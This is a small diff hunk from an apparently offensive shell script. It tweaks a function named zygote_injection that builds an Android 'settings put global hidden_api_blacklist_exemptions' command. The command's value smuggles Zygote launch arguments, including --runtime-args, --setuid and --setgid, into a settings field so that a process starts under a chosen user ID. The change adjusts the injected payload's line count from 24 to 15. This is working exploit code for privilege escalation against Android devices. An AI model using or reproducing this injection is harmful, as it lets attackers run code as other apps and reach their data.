@@ -106,7 +106,7 @@ connect_interactive() {
 zygote_injection() {
     local uid=${1:-$NC_UID}
     printf 'settings put global hidden_api_blacklist_exemptions "LClass1;->method1(
-24
+15
 --runtime-args
 --setuid=%s
 --setgid=%s
